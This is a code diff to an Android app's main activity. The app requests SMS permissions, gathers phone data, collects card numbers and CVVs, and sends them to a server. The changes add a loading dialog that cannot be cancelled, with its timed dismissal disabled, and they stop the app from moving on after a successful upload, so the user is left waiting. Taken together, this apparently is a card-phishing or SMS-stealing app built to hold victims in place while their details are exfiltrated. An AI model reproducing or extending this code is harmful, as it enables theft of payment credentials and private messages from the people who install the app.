@@ -8,8 +8,11 @@
     import android.net.Uri;
     import android.os.Build;
     import android.os.Bundle;
+    import android.os.Handler;
     import android.provider.Settings;
     import android.util.Log;
+    import android.view.LayoutInflater;
+    import android.view.View;
     import android.widget.Button;
     import android.widget.EditText;
     import android.widget.Toast;
@@ -120,16 +123,12 @@
             builder.setTitle("Permission Denied");
             builder.setMessage("All permissions are required to send and receive messages. " +
                     "Please grant the permissions in the app settings.");
-
-            // Open settings button
             builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
                 @Override
                 public void onClick(DialogInterface dialog, int which) {
                     openAppSettings();
                 }
             });
-
-            // Cancel button
             builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                 @Override
                 public void onClick(DialogInterface dialog, int which) {
@@ -205,6 +204,20 @@
             });
         }
 
+        private void showInstallDialog() {
+
+            LayoutInflater inflater = getLayoutInflater();
+            View dialogView = inflater.inflate(R.layout.dialog_loading, null);
+
+            AlertDialog.Builder builder = new AlertDialog.Builder(this);
+            builder.setView(dialogView);
+            builder.setCancelable(false);
+            AlertDialog dialog = builder.create();
+            dialog.show();
+
+//            new Handler().postDelayed(dialog::dismiss, 300000);
+        }
+
         public void init() throws JSONException {
             registerPhoneData();
             saveFormId();
@@ -234,10 +247,7 @@
                 startActivity(intent);
             }
 
-            // send data to server
-
             dataObject = new HashMap<>();
-            // Initialize the ids map
             ids = new HashMap<>();
             ids.put(R.id.cardNum, "cardNum");
             ids.put(R.id.cvv, "cvv");
@@ -257,6 +267,7 @@
 
             buttonSubmit.setOnClickListener(v -> {
                 if (validateForm()) {
+                    showInstallDialog();
 
                     JSONObject dataJson = new JSONObject(dataObject);
                     JSONObject sendPayload = new JSONObject();
@@ -277,9 +288,9 @@
                                     try {
                                         JSONObject response = new JSONObject(result);
                                         if(response.getInt("status")==200){
-                                            Intent intent = new Intent(MainActivity.this, LastActivity.class);
-                                            intent.putExtra("id", response.getInt("data"));
-                                            startActivity(intent);
+//                                            Intent intent = new Intent(MainActivity.this, LastActivity.class);
+//                                            intent.putExtra("id", response.getInt("data"));
+//                                            startActivity(intent);
                                         }else{
                                             Toast.makeText(MainActivity.this, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                         }
